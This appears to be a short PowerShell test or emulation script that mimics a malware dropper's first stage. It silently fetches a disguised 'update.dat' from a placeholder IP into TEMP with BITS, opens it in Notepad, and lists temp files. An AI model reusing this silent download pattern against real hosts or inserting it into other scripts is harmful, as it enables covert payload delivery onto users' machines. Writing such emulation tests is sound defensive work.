
$Stage1Url = "https://192.0.2.18/update.dat"
$PayloadPath = "$env:TEMP\update.dat"
Start-BitsTransfer -Source $Stage1Url -Destination $PayloadPath -ErrorAction SilentlyContinue
Start-Process -FilePath "notepad.exe" -ArgumentList $PayloadPath -ErrorAction SilentlyContinue
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
